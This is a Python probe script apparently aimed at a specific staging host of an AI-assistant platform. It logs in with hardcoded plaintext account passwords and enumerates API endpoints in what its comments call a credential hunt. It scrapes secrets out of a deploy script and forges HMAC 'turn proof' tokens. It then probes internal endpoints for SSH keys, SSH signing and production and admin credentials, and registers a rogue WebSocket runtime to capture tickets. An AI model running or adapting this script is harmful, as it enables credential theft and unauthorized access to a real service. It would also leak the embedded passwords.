# -*- coding: utf-8 -*-
# i28845 probe: stage-assistant web run-now agent_do dispatch / build-* diagnosis / WS register / web cred enum
import json,os,time,base64,random,string,socket,ssl,struct,sys,re,hashlib,hmac,subprocess,threading

HOST="stage-assistant.lumiiai.cn"
BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CRED=("lc-zone-leader@lumii.dev","Lianchuang#2026")
_start=time.time()
def el(): return round(time.time()-_start,1)

def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    b=base64.b64encode(s.encode("utf-8")).decode()
    sys.stdout.write("R:%s:%s\n"%(k,b)); sys.stdout.flush()

def curl(args,timeout=40,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+10)
        return p.returncode,p.stdout,p.stderr
    except Exception as e:
        return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=16000,use_cookie=True,raw_body=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if use_cookie:
        args+=["-b","cj","-c","cj"]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if raw_body is not None:
        data=raw_body if isinstance(raw_body,bytes) else raw_body.encode()
        args+=["-H","Content-Type: application/json","--data-binary","@-"]
    elif body is not None:
        data=json.dumps(body).encode()
        args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET":
        args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:160]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

# ---- login (plain identifier/password works on stage) ----
def login(ident,pw):
    rc,out,err=curl(["-m","45","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),
                     BASE+"/api/auth/login"],timeout=50)
    txt=out.decode("utf-8","replace"); code="";m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt)
    if m: code=m.group(1)
    mc=re.search(r"lumii_session=([^;]+)",txt); ck=("lumii_session="+mc.group(1)) if mc else ""
    body=txt.split("\r\n\r\n",1)[-1] if "\r\n\r\n" in txt else txt
    uid=""
    try:
        bj=json.loads(body[body.find("{"):]) if "{" in body else {}
        uid=(bj.get("user") or {}).get("id") or bj.get("id") or ""
    except Exception: pass
    return code,ck,uid,body[:220]

cookie="";UID="";ME={}
for ident,pw in [CRED,("e2e-accept@lumii.dev","E2eAccept!0813")]:
    code,ck,uid,body=login(ident,pw)
    R("A_try_%s"%ident.split("@")[0],{"code":code,"uid":uid,"body":body[:120]})
    if code=="200" and ck: cookie=ck;UID=uid;break
if not cookie:
    R("FATAL_no_login",{}); sys.exit(0)
open("cookiefile.txt","w").write(cookie)
me=call("/api/me",hdrs={"Cookie":cookie}); ME=J(me) or {}
R("A_me",{"code":me["code"],"body":me["body"][:1500]})
ORG=""
try:
    ORG=(ME.get("org") or {}).get("id") or ME.get("orgId") or (ME.get("organization") or {}).get("id") or ""
except Exception: pass
if not ORG:
    # try /api/org
    o=call("/api/org",hdrs={"Cookie":cookie}); oj=J(o) or {}
    ORG=oj.get("id") or (oj.get("org") or {}).get("id") or ""
R("A_org",{"org":ORG})

# ---- web-side read-only enum (cred hunt) ----
for p in ["/api/runtimes","/api/assistants?limit=50","/api/projects","/api/integrations",
          "/api/members?limit=50","/api/settings","/api/environments","/api/tickets/folders",
          "/api/iam/assignments","/api/audit?limit=5"]:
    r=call(p,hdrs={"Cookie":cookie},maxlen=6000)
    R("WEB_%s"%re.sub(r"[^a-z0-9]+","_",p.strip("/"))[:40],{"code":r["code"],"len":r["len"],"body":r["body"][:5000]})

# ---- create self runtime ----
RID="";RTOKEN="";DEPLOY=""
cr=call("/api/runtimes","POST",{"name":"rb28845-%d"%random.randint(1000,9999),"visibility":"org"},hdrs={"Cookie":cookie},maxlen=60000)
if not (cr["code"][:1]=="2"):
    R("B_retry_plain",{"code":cr["code"],"body":cr["body"][:300]})
    cr=call("/api/runtimes","POST",{"name":"rb28845-%d"%random.randint(1000,9999)},hdrs={"Cookie":cookie},maxlen=60000)
DEPLOY=cr["body"]; cj=J(cr) or {}
mid=re.search(r"AGENT_ID='([^']+)'",DEPLOY); mtk=re.search(r"AGENT_TOKEN='([^']+)'",DEPLOY)
RID=mid.group(1) if mid else (cj.get("id") or (cj.get("runtime") or {}).get("id") or "")
RTOKEN=mtk.group(1) if mtk else (cj.get("token") or cj.get("agentToken") or (cj.get("runtime") or {}).get("token") or "")
R("B_runtime",{"code":cr["code"],"rid":RID,"token_len":len(RTOKEN),"deploy_head":DEPLOY[:400],
               "has_TURN_PROOF_SECRET":("TURN_PROOF_SECRET" in DEPLOY),"deploy_len":len(DEPLOY)})
# dump any secret-looking bits from deploy script
secrets={}
for pat,key in [(r"LUMII_TURN_PROOF_SECRET='?([A-Za-z0-9_\-]+)'?","tps"),
                (r"TURN_PROOF_SECRET='?([A-Za-z0-9_\-]+)'?","tps2"),
                (r"SIDECAR_URL='?([^'\n ]+)'?","sidecar"),
                (r"PROOF_KEY='?([A-Za-z0-9_\-]+)'?","pk"),
                (r"AGENT_WS[A-Z_]*='?([A-Za-z0-9_\./:?=&\-]+)'?","ws"),
                (r"([0-9a-f]{64})","hex64")]:
    m=re.search(pat,DEPLOY)
    if m: secrets[key]=m.group(1)[:120]
R("B_deploy_secrets",secrets)

PROOF_KEY=None
if RID and RTOKEN:
    k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN,"Cookie":cookie},use_cookie=False)
    if k["code"]!="200":
        k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"Authorization":"Bearer "+RTOKEN},use_cookie=False)
    if k["code"]=="200":
        try: PROOF_KEY=(J(k) or {}).get("proof_key")
        except Exception: pass
    R("B_keys_current",{"code":k["code"],"body":k["body"][:600],"proof_len":len(PROOF_KEY or "")})

SK="conv_28845"
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def make_proof(actor):
    if not PROOF_KEY: return ""
    now=int(time.time())
    claims={"session_key":SK,"platform":"dashboard","chat_id":SK,"actor_id":actor,"iss":RID,"aud":RID,"iat":now-5,"exp":now+1500}
    p=b64u(json.dumps(claims,separators=(",",":")).encode())
    sig=b64u(hmac.new(PROOF_KEY.encode(),p.encode(),hashlib.sha256).digest())
    return "v2."+p+"."+sig
PROOF=make_proof(UID)

# ---- /internal/build/* diagnosis: route existence + perRuntime + ticket requirement ----
MH={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID}   # machine identity only
MHP=dict(MH); 
if PROOF: MHP["x-lumii-turn-proof"]=PROOF
build_tests=[
    ("accounts_noproof","/internal/build/accounts",{"names":["PROD","SSH","LUMII","ADMIN"]},MH),
    ("accounts_proof","/internal/build/accounts",{"names":["PROD","SSH","LUMII","ADMIN"]},MHP),
    ("sshkeys_noproof","/internal/build/ssh-keys",{},MH),
    ("sshsign_noproof","/internal/build/ssh-sign",{"purpose":"ssh_agent"},MH),
    ("credential_noproof","/internal/build/credential",{"environment_id":"x"},MH),
]
for tag,path,body,hd in build_tests:
    r=call(path,"POST",body,hdrs=hd,use_cookie=False,maxlen=1500,timeout=25)
    R("BUILD_%s"%tag,{"code":r["code"],"body":r["body"][:1200],"err":r["err"][:100]})

# also test a generic /internal endpoint with machine+proof to see enforce state
a=call("/internal/authz/allows","POST",{"platform":"dashboard","actor_id":UID,"session_key":SK,"code":"drive.manage_all"},hdrs=MHP,use_cookie=False)
R("IA_authz",{"code":a["code"],"body":a["body"][:400]})

# ---- WS register as our runtime ----
class WS:
    def __init__(self,host,path,hdrs=None,timeout=15):
        self.s=socket.create_connection((host,443),timeout=timeout)
        self.s.settimeout(timeout)
        ctx=ssl.create_default_context()
        self.s=ctx.wrap_socket(self.s,server_hostname=host)
        key=base64.b64encode(os.urandom(16)).decode()
        req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n")%(path,host,key)
        for k,v in (hdrs or {}).items(): req+="%s: %s\r\n"%(k,v)
        req+="\r\n"
        self.s.sendall(req.encode())
        buf=b""
        while b"\r\n\r\n" not in buf: buf+=self.s.recv(4096)
        self.hdr=buf.split(b"\r\n\r\n",1)[0].decode("latin1"); self.rest=buf.split(b"\r\n\r\n",1)[1]
        self.ok=(" 101 " in self.hdr.split("\r\n")[0])
        self.buf=self.rest
    def send(self,obj,op=1):
        data=obj if isinstance(obj,bytes) else json.dumps(obj).encode()
        h=b"\x81" if op==1 else b"\x88"
        n=len(data); mask=os.urandom(4)
        if n<126: hdr=h+bytes([0x80|n])
        elif n<65536: hdr=h+bytes([0x80|126])+struct.pack(">H",n)
        else: hdr=h+bytes([0x80|127])+struct.pack(">Q",n)
        masked=bytes(b^mask[i%4] for i,b in enumerate(data))
        self.s.sendall(hdr+mask+masked)
    def _need(self,n):
        while len(self.buf)<n:
            d=self.s.recv(4096)
            if not d: raise EOFError()
            self.buf+=d
    def recv(self):
        self._need(2); b0,b1=self.buf[0],self.buf[1]; self.buf=self.buf[2:]
        op=b0&0x0f; n=b1&0x7f
        if n==126: self._need(2); n=struct.unpack(">H",self.buf[:2])[0]; self.buf=self.buf[2:]
        elif n==127: self._need(8); n=struct.unpack(">Q",self.buf[:8])[0]; self.buf=self.buf[8:]
        self._need(n); data=self.buf[:n]; self.buf=self.buf[n:]
        return op,data

WSFRAMES=[]
def ws_worker():
    try:
        w=WS(HOST,"/api/ws/agent?agent_id=%s&token=%s"%(RID,RTOKEN),
             hdrs={"User-Agent":UA,"Origin":BASE})
        R("WS_open",{"ok":w.ok,"hdr":w.hdr[:200]})
        w.send({"type":"register","platform":"dashboard","capabilities":[],
                "metadata":{"agent_id":RID,"token":RTOKEN,"hostname":"rb28845","supported_agents":[],"platform":"linux"}})
        end=time.time()+65
        while time.time()<end:
            try:
                op,data=w.recv()
            except Exception:
                break
            if op==8: R("WS_close",{"data":data.decode("utf-8","replace")[:150]}); break
            try: msg=json.loads(data.decode("utf-8","replace"))
            except Exception: msg={"_raw":data[:200].decode("latin1")}
            t=msg.get("type") if isinstance(msg,dict) else None
            s=json.dumps(msg,ensure_ascii=False)[:1500]
            WSFRAMES.append((t,s))
            R("WS_f_%d_%s"%(len(WSFRAMES),t or "raw"),{"msg":s})
            # capture any ticket
            if "turn_ticket" in s or "ticket" in s.lower():
                R("WS_TICKET_%d"%len(WSFRAMES),{"msg":s})
        try: w.send(b"",op=8)
        except Exception: pass
    except Exception as e:
        R("WS_err",{"e":repr(e)[:200]})
thr=None
if RID and RTOKEN:
    thr=threading.Thread(target=ws_worker,daemon=True); thr.start()
    time.sleep(4)

# ---- agent_do dispatch test ----
# find default folder
folders=call("/api/tickets/folders",hdrs={"Cookie":cookie},maxlen=8000); fj=J(folders) or {}
FOLDER=""
try:
    arr=fj.get("folders") or fj.get("items") or (fj if isinstance(fj,list) else [])
    for f in arr:
        fid=f.get("id") or ""
        if fid.startswith("tkfd_default") or f.get("isDefault") or f.get("default"):
            FOLDER=fid; break
    if not FOLDER and arr: FOLDER=arr[0].get("id") or ""
except Exception: pass
if not FOLDER:
    # create one via internal with machine+proof (owned by admin actor)
    b={"platform":"dashboard","actor_id":UID,"session_key":SK,"name":"rb28845f","icon":"grid","description":"x"}
    c=call("/internal/tickets/create-folder","POST",b,hdrs=MHP,use_cookie=False)
    cj=J(c) or {}; FOLDER=(cj.get("folder") or {}).get("id") or ""
R("C_folder",{"folder":FOLDER,"code":folders["code"]})

# list assistants -> pick one, note its runtime binding
asst=call("/api/assistants?limit=50",hdrs={"Cookie":cookie},maxlen=12000); aj=J(asst) or {}
ALIST=[]
try:
    ALIST=aj.get("assistants") or (aj if isinstance(aj,list) else (aj.get("items") or []))
except Exception: pass
ASST_ID=""; ASST_INFO=[]
for a in ALIST[:8]:
    ASST_INFO.append({"id":a.get("id"),"name":a.get("name"),"runtimeId":a.get("runtimeId") or a.get("runtime_id") or a.get("runtime"),"owner":a.get("ownerId")})
    if a.get("id") and not ASST_ID: ASST_ID=a.get("id")
R("C_assistants",{"n":len(ALIST),"sample":ASST_INFO})

# try create an assistant bound to our runtime
crt=call("/api/assistants","POST",{"name":"rb28845a","runtimeId":RID},hdrs={"Cookie":cookie},maxlen=3000)
R("C_create_asst",{"code":crt["code"],"body":crt["body"][:1500]})
BOUND_ASST=""
cj2=J(crt) or {}
try: BOUND_ASST=(cj2.get("assistant") or cj2).get("id") or ""
except Exception: BOUND_ASST=""
if not BOUND_ASST: BOUND_ASST=ASST_ID

def wf_run(tag,steps,timeout_s=40):
    def mk(name,steps):
        return {"name":name[:60],"enabled":True,
                "trigger":{"kind":"schedule","every":"once","onceAt":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+9000))},
                "steps":steps,"overlap":"skip"}
    cr=call("/api/tickets/folders/%s/workflows"%FOLDER,"POST",mk(tag,steps),hdrs={"Cookie":cookie},maxlen=4000)
    wj=J(cr) or {}; wid=(wj.get("workflow") or {}).get("id") or wj.get("id") or ""
    R("WF_%s_create"%tag,{"code":cr["code"],"wid":wid,"body":cr["body"][:500]})
    if not wid: return
    rn=call("/api/tickets/folders/%s/workflows/%s/run-now"%(FOLDER,wid),"POST",{},hdrs={"Cookie":cookie},timeout=timeout_s,maxlen=8000)
    rj=J(rn) or {}
    run=rj.get("run") or (rj if rj.get("status") else None)
    R("WF_%s_run"%tag,{"code":rn["code"],"status":(run or {}).get("status") if isinstance(run,dict) else None,
                       "err":(run or {}).get("error") if isinstance(run,dict) else None,
                       "errMsg":(run or {}).get("errorMessage") if isinstance(run,dict) else None,
                       "stepsLog":(run or {}).get("stepsLog") if isinstance(run,dict) else None,
                       "raw":rn["body"][:1200]})
    return wid

if FOLDER and BOUND_ASST:
    aid=BOUND_ASST
    wf_run("agentdo",[{"id":"a1","kind":"agent_do","assistantId":aid,"prompt":"请只回复 ok","sessionMode":"new_per_run"}],timeout_s=45)
else:
    R("WF_skip",{"folder":FOLDER,"asst":BOUND_ASST})

# let WS read remaining frames
if thr:
    thr.join(timeout=70)
R("WS_summary",{"n":len(WSFRAMES),"types":[t for t,_ in WSFRAMES]})

# read any workflow-runs
wr=call("/api/tickets/folders/%s/workflow-runs?limit=10"%FOLDER,hdrs={"Cookie":cookie},maxlen=20000) if FOLDER else {"code":"-","body":"","len":0}
R("WF_runs",{"code":wr["code"],"body":wr["body"][:12000]})

R("DONE",{"t":el()})
